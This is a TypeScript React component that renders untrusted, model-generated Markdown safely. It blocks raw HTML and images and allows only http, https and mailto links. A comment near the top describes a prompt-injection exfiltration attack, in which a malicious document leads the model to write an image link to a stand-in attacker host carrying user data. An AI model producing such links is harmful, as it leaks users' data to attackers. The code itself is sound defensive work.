import type { ComponentProps } from "react";
import ReactMarkdown, { type Components } from "react-markdown";
import remarkGfm from "remark-gfm";
import { cn } from "@/lib/utils";

// Renderiza o Markdown que vem do modelo, de relatórios e de documentos, tudo conteúdo NÃO CONFIÁVEL.
// - HTML cru NUNCA é interpretado: <script>, <img onerror=…> etc. aparecem como texto (padrão do
//   react-markdown; não usar rehype-raw nem dangerouslySetInnerHTML).
// - IMAGENS são bloqueadas: um documento malicioso pode fazer o modelo escrever ![](https://atacante/?q=DADO)
//   e o navegador enviaria o dado sozinho, sem clique (o react-markdown renderizaria a <img> e ainda
//   pré-carregaria a URL). Vira o texto "[imagem: alt]".
// - Links só com http, https e mailto, abrem em outra aba, sem referrer e sem herdar o contexto.

const ALLOWED_URL = /^(?:https?:|mailto:)/i;

/** Qualquer URL fora da lista vira "" (o link some, o texto fica). Exportado para o teste. */
export function safeUrl(url: string): string {
  return ALLOWED_URL.test(url.trim()) ? url : "";
}

const heading = (cls: string) =>
  function Heading({ children }: ComponentProps<"h1">) {
    return <p role="heading" aria-level={2} className={cn("font-semibold text-text-primary", cls)}>{children}</p>;
  };

const components: Components = {
  // Títulos do conteúdo não devem competir com os títulos da própria página (h1..h6 → 2 níveis de tamanho).
  h1: heading("mt-5 mb-2 text-xl"),
  h2: heading("mt-5 mb-2 text-lg"),
  h3: heading("mt-4 mb-1.5 text-base"),
  h4: heading("mt-3 mb-1 text-sm"),
  h5: heading("mt-3 mb-1 text-sm"),
  h6: heading("mt-3 mb-1 text-sm"),
  p: ({ children }) => <p className="my-2 leading-relaxed">{children}</p>,
  ul: ({ children }) => <ul className="my-2 list-disc pl-5 [&_ul]:my-1">{children}</ul>,
  ol: ({ children }) => <ol className="my-2 list-decimal pl-5 [&_ol]:my-1">{children}</ol>,
  li: ({ children }) => <li className="my-0.5">{children}</li>,
  blockquote: ({ children }) => (
    <blockquote className="my-3 border-l-2 border-border pl-3 text-text-secondary">{children}</blockquote>
  ),
  hr: () => <hr className="my-4 border-border" />,
  code: ({ className, children }) =>
    className ? (
      <code className={cn("font-mono text-[0.85em]", className)}>{children}</code>
    ) : (
      <code className="rounded bg-surface-raised px-1 py-0.5 font-mono text-[0.85em]">{children}</code>
    ),
  pre: ({ children }) => (
    <pre className="my-3 overflow-x-auto rounded-lg border border-border bg-surface p-3 text-sm">{children}</pre>
  ),
  table: ({ children }) => (
    <div className="my-3 overflow-x-auto">
      <table className="w-full border-collapse text-sm">{children}</table>
    </div>
  ),
  th: ({ children }) => <th className="border border-border bg-surface-raised px-2 py-1 text-left font-medium">{children}</th>,
  td: ({ children }) => <td className="border border-border px-2 py-1 align-top">{children}</td>,
  a: ({ href, children }) =>
    href ? (
      <a href={href} target="_blank" rel="noopener noreferrer nofollow" className="text-accent-primary underline underline-offset-2">
        {children}
      </a>
    ) : (
      <span>{children}</span>
    ),
  img: ({ alt }) => <span className="text-text-muted">[imagem{alt ? `: ${alt}` : ""}]</span>,
};

export function SafeMarkdown({ children, className }: { children: string; className?: string }) {
  return (
    <div className={cn("text-sm text-text-primary", className)}>
      <ReactMarkdown remarkPlugins={[remarkGfm]} components={components} urlTransform={safeUrl}>
        {children}
      </ReactMarkdown>
    </div>
  );
}
